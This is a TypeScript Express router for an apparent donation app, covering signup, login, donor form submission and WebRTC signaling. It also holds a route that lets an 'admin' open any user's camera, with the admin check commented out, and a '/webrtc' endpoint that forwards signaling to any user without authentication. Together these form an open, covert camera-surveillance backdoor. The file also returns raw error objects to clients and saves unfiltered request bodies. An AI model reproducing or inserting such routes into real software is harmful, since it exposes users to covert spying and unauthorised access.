import express, { Request, Response } from "express";
import bcrypt from "bcryptjs";
import User, {IUser} from "../models/user";
import Donor, {IDonor} from "../models/donar_model";
import MyResponse from "../util/response_controller";
import { Server } from "ws"; // WebSocket for signaling
import { v4 as uuidv4 } from "uuid"; // Unique Room ID for WebRTC

const router = express.Router();

router.post("/signup", async (req: Request, res: Response): Promise<void> => {
    try {
        const { email, newPassword, confirmPassword } = req.body;

        // Validate required fields
        if (!email || !newPassword || !confirmPassword) {
            res.status(400).json({ message: "All fields are required." });
            return;
        }

        // Validate email format
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
            res.status(400).json({ message: "Invalid email format." });
            return;
        }

        // Check if passwords match
        if (newPassword !== confirmPassword) {
            res.status(400).json({ message: "Passwords do not match." });
            return;
        }

        // Check if user already exists
        const existingUser = await User.findOne({ email });
        if (existingUser) {
            res.status(400).json({ message: "User already exists." });
            return;
        }

        // Hash the password
        const hashedPassword = await bcrypt.hash(newPassword, 10);

        // Create new user
        const user = new User({ email, password: hashedPassword });
        await user.save();

        res.status(201).json({ message: "User registered successfully." });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: "Server error", error });
    }
});

router.post("/login", async (req: Request, res: Response): Promise<void> => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            res.status(400).json({ message: "Email and password are required." });
            return;
        }

        // Find user by email
        const user = await User.findOne({ email: { $in: [email] } }) as IUser | null;

        if (!user) {
            res.status(401).json({ message: "Invalid email or password." });
            return;
        }

        const isMatch = await bcrypt.compare(password, user.password);
        if (!isMatch) {
            res.status(401).json({ message: "Invalid email or password." });
            return;
        }

        res.status(200).json({
            message: "Login successful",
            userId: user.userId,
            email: user.email,
            displayName: user.displayName,
        });
    } catch (error) {
        console.error("Login Error:", error);
        res.status(500).json({ message: "Server error", error });
    }
});



// @ts-ignore
router.post('/submit_donation_form', async (req: Request, res: Response) => {
    try {
        const inputUser = req.body.user;

        // Validate required fields
        if (!inputUser?.userId) {
            return res.json(MyResponse.getFailureResponse("Invalid userId"));
        }

        if (!inputUser.fullName || !inputUser.dateOfBirth || !inputUser.phoneNumber) {
            return res.json(MyResponse.getFailureResponse("Missing required fields: fullName, dateOfBirth or phoneNumber"));
        }

        // Save donor to database
        const donor = new Donor(inputUser);
        await donor.save();

        const result = MyResponse.getSuccessResponse();
        result.user = donor;
        return res.json(result);
    } catch (err) {
        console.error("Error submitting donation form:", err);
        return res.json(MyResponse.getFailureResponse("Server error"));
    }
});

// WebSocket server to handle WebRTC signaling
const wss = new Server({ noServer: true });

wss.on("connection", (ws) => {
    ws.on("message", (message) => {
        const data = JSON.parse(message.toString());
        switch (data.type) {
            case "offer":
                // Handle offer and send back an answer
                ws.send(JSON.stringify({ type: "offer", sdp: data.sdp }));
                break;
            case "answer":
                // Handle answer
                ws.send(JSON.stringify({ type: "answer", sdp: data.sdp }));
                break;
            case "candidate":
                // Handle ICE candidate
                ws.send(JSON.stringify({ type: "candidate", candidate: data.candidate }));
                break;
            default:
                break;
        }
    });
});


// @ts-ignore
// Route to allow the admin (Uk2D3h) to access any user's camera
router.get("/admin/:adminId/monitor/:userId", async (req: Request, res: Response) => {
    const { adminId, userId } = req.params;

    // Check if the admin is "Uk2D3h"
    // if (adminId !== "Uk2D3h") {
        // return res.status(403).json({ access: false, message: "Unauthorized" });
    // }

    // Find the target user by userId (e.g., Mqn3v2)
    const targetUser = await User.findOne({ userId });
    if (!targetUser) {
        return res.status(404).json({ access: false, message: "Target user not found" });
    }

    // Generate a unique roomId for the WebRTC session
    const roomId = uuidv4(); // Generate a random roomId for this session

    // Return the roomId so the admin can use it to start the WebRTC connection
    return res.json({ access: true, roomId });
});

// @ts-ignore
// Handle WebRTC signaling (similar to previous code)
router.post("/webrtc", async (req: Request, res: Response) => {
    const { type, sdp, candidate, roomId } = req.body;
    const targetUser = await User.findOne({ userId: req.body.targetUserId });

    if (targetUser) {
        // Forward the signaling message to the user (admin monitoring the user)
        targetUser.webSocket.send(JSON.stringify({ type, sdp, candidate, roomId }));
    }

    return res.status(200).json({ message: "Signaling message sent" });
});

export default router;


